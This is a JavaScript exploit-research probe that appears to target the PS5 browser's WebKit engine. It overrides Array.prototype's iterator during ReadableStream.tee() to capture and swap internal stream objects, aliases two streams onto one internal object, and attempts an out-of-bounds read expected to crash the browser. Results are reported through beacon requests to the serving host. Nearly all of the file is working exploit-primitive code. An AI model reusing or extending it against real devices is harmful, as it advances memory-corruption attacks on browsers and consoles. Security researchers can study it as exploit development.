/*
 * V441 -- XHTML CE probe + InternalRS aliasing
 *
 * Two independent tracks:
 *
 * Track 1 (XHTML): Does the PS5 browser load main-frame XHTML?
 *   - The loader (fa-v441-xhtml.xhtml) is served as application/xhtml+xml
 *   - If it loads and this script runs, XHTML is supported
 *   - If custom elements fire during XML parsing, CE-CONSTRUCT beacons arrive
 *
 * Track 2 (Alias): Capture real InternalRS from tee, substitute into second tee
 *   - Two ReadableStream wrappers point to the SAME InternalReadableStream
 *   - Tests: aliased lock state, concurrent readers, cancel behavior
 *   - This is SAFE (no OOB, no crash) -- all operations go through JS builtins
 *
 * Track 3 (OOB-dead confirmation): Prove Strong<JSObject> destructor zeros data
 *   - Single tee with 1-element intercept (no RS check)
 *   - Expected: crash (confirms OOB is fundamentally dead)
 *   - Runs LAST so other tracks complete first
 *
 * Beacon prefix: V441-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V441-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// ================================================================
// Track 1: XHTML detection
// If we're running, the page loaded. But did it load as XHTML?
// ================================================================
function testXHTML(cb) {
  B("XHTML-START");

  // Check document content type
  try {
    B("XHTML-CTYPE", document.contentType || "unknown");
  } catch(e) { B("XHTML-CTYPE-ERR", e.message.slice(0,40)); }

  // Check if XMLParser was used (XHTML-specific behavior)
  try {
    B("XHTML-DOCTYPE", document.doctype ? document.doctype.name : "none");
  } catch(e) {}

  // Check if custom elements are available
  try {
    B("XHTML-CE-SUPPORT", typeof customElements !== "undefined" ? "yes" : "no");
    if (typeof customElements !== "undefined") {
      B("XHTML-CE-DEFINE", typeof customElements.define);
    }
  } catch(e) { B("XHTML-CE-ERR", e.message.slice(0,40)); }

  // Check if our test CE was constructed (defined in the XHTML inline script)
  try {
    var ceEl = document.getElementById("probe-ce-1");
    B("XHTML-CE-FOUND", ceEl ? "yes" : "no");
    if (ceEl) {
      B("XHTML-CE-CTOR", ceEl.getAttribute("data-constructed") || "no");
      B("XHTML-CE-TAG", ceEl.tagName);
    }
  } catch(e) { B("XHTML-CE-QUERY-ERR", e.message.slice(0,40)); }

  // Check the container for mutations from CE constructor
  try {
    var container = document.getElementById("ce-container");
    if (container) {
      B("XHTML-CONTAINER-KIDS", container.childNodes.length);
    }
  } catch(e) {}

  B("XHTML-DONE");
  if (cb) setTimeout(cb, 500);
}

// ================================================================
// Track 2: InternalRS aliasing via captured objects
// ================================================================
function testAlias(cb) {
  B("ALIAS-START");

  // Step 1: First tee -- capture the real InternalRS objects
  var captured0 = null, captured1 = null;
  var captureIntercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !captureIntercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        captureIntercepted = true;
        captured0 = self[0];
        captured1 = self[1];
        B("ALIAS-CAPTURED", {t0: typeof captured0, t1: typeof captured1});
      }
    }
    return origIter.call(self);
  };

  var rs1;
  var branches1;
  try {
    rs1 = new ReadableStream({
      start: function(c) {
        c.enqueue("first-chunk-A");
        c.enqueue("first-chunk-B");
        c.close();
      }
    });
    branches1 = rs1.tee();
    B("ALIAS-TEE1-OK", {len: branches1.length});
  } catch(e) {
    B("ALIAS-TEE1-ERR", e.message.slice(0,60));
    Array.prototype[Symbol.iterator] = origIter;
    if (cb) setTimeout(cb, 100);
    return;
  }
  Array.prototype[Symbol.iterator] = origIter;

  if (!captured0) {
    B("ALIAS-NO-CAPTURE");
    if (cb) setTimeout(cb, 100);
    return;
  }

  // Step 2: Second tee -- substitute branch1 with captured0
  var subIntercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !subIntercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        subIntercepted = true;
        B("ALIAS-SUB-FIRED");
        var idx = 0;
        var items = [self[0], captured0]; // branch0 normal, branch1 = captured0
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  var rs2, branches2;
  try {
    rs2 = new ReadableStream({
      start: function(c) {
        c.enqueue("second-chunk-X");
        c.close();
      }
    });
    branches2 = rs2.tee();
    B("ALIAS-TEE2-OK", {len: branches2.length});
  } catch(e) {
    B("ALIAS-TEE2-ERR", e.message.slice(0,60));
    Array.prototype[Symbol.iterator] = origIter;
    if (cb) setTimeout(cb, 100);
    return;
  }
  Array.prototype[Symbol.iterator] = origIter;

  // Now branches2[1] should wrap captured0 (InternalRS from first tee's branch0)
  // And branches1[0] also wraps captured0
  // They ALIAS the same InternalReadableStream

  // Test A: instanceof check
  try {
    B("ALIAS-B2R1-IS-RS", branches2[1] instanceof ReadableStream);
    B("ALIAS-B2R1-CTOR", branches2[1].constructor.name);
  } catch(e) { B("ALIAS-B2R1-TYPE-ERR", e.message.slice(0,40)); }

  // Test B: locked state (should be false initially)
  try {
    B("ALIAS-B1R0-LOCKED", branches1[0].locked);
    B("ALIAS-B2R1-LOCKED", branches2[1].locked);
  } catch(e) { B("ALIAS-LOCKED-ERR", e.message.slice(0,40)); }

  // Test C: Get reader on branches2[1] (uses captured0's private props)
  var aliasReader = null;
  try {
    aliasReader = branches2[1].getReader();
    B("ALIAS-READER-OK!!!");

    // Now branches1[0] should also show as locked (same internal stream)
    try {
      B("ALIAS-B1R0-LOCKED-AFTER", branches1[0].locked);
    } catch(e) { B("ALIAS-B1R0-LOCKED-AFTER-ERR", e.message.slice(0,40)); }

  } catch(e) {
    B("ALIAS-READER-ERR", e.message.slice(0,60));
  }

  // Test D: Read from aliased reader -- what data comes out?
  if (aliasReader) {
    aliasReader.read().then(function(res) {
      B("ALIAS-READ1!!!", {done: res.done, val: String(res.value).slice(0,30)});
      return aliasReader.read();
    }).then(function(res) {
      B("ALIAS-READ2!!!", {done: res.done, val: res.value ? String(res.value).slice(0,30) : "undef"});
      aliasReader.releaseLock();

      // Test E: After release, try to get reader on branches1[0]
      try {
        var r1 = branches1[0].getReader();
        B("ALIAS-B1R0-READER-AFTER-OK");
        r1.read().then(function(res) {
          B("ALIAS-B1R0-READ!!!", {done: res.done, val: res.value ? String(res.value).slice(0,30) : "undef"});
          r1.releaseLock();
        }).catch(function(e) { B("ALIAS-B1R0-READ-ERR", e.message.slice(0,40)); });
      } catch(e) {
        B("ALIAS-B1R0-READER-AFTER-ERR", e.message.slice(0,60));
      }

      // Test F: Cancel branches2[1] -- does it affect branches1[0]?
      setTimeout(function() {
        try {
          branches2[1].cancel("test-cancel").then(function() {
            B("ALIAS-CANCEL-OK");
            // Check branches1[0] state after cancel
            try {
              B("ALIAS-B1R0-LOCKED-POST-CANCEL", branches1[0].locked);
              var r2 = branches1[0].getReader();
              r2.read().then(function(res) {
                B("ALIAS-B1R0-POST-CANCEL-READ", {done: res.done});
              }).catch(function(e) {
                B("ALIAS-B1R0-POST-CANCEL-READ-ERR", e.message.slice(0,40));
              });
            } catch(e) {
              B("ALIAS-B1R0-POST-CANCEL-ERR", e.message.slice(0,60));
            }
          }).catch(function(e) { B("ALIAS-CANCEL-ERR", e.message.slice(0,40)); });
        } catch(e) { B("ALIAS-CANCEL-THROW", e.message.slice(0,40)); }

        B("ALIAS-DONE");
        if (cb) setTimeout(cb, 3000);
      }, 1000);
    }).catch(function(e) {
      B("ALIAS-READ-ERR", e.message.slice(0,60));
      B("ALIAS-DONE");
      if (cb) setTimeout(cb, 1000);
    });
  } else {
    B("ALIAS-DONE");
    if (cb) setTimeout(cb, 1000);
  }
}

// ================================================================
// Track 3: OOB-dead confirmation
// Simple unconditional 1-element intercept (no instanceof check)
// Expected: crash. This proves Strong<JSObject> zeros the data.
// RUNS LAST.
// ================================================================
function testOOBDead(cb) {
  B("OOB-DEAD-START");

  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        B("OOB-DEAD-INTERCEPT");
        // Return only 1 element -- results[1] reads OOB (zeroed data)
        var idx = 0;
        return {
          next: function() {
            if (idx === 0) { idx++; return {value: self[0], done: false}; }
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  var rs = new ReadableStream({
    start: function(c) { c.enqueue("oob-dead"); c.close(); }
  });

  try {
    var result = rs.tee();
    // If we get here, the OOB read didn't crash!
    B("OOB-DEAD-SURVIVED!!!", {len: result.length});
    if (result[1]) {
      B("OOB-DEAD-R1-TYPE", typeof result[1]);
      B("OOB-DEAD-R1-CTOR", result[1].constructor ? result[1].constructor.name : "?");
    } else {
      B("OOB-DEAD-R1-NULL");
    }
  } catch(e) {
    B("OOB-DEAD-CATCH", e.message.slice(0,60));
  }

  Array.prototype[Symbol.iterator] = origIter;
  B("OOB-DEAD-DONE");
  if (cb) setTimeout(cb, 1000);
}

// ================================================================
// Run: XHTML first, then Alias, then OOB-dead last (may crash)
// ================================================================
B("RUNNING");
testXHTML(function() {
  testAlias(function() {
    testOOBDead(function() {
      B("ALL-DONE");
    });
  });
});

})();
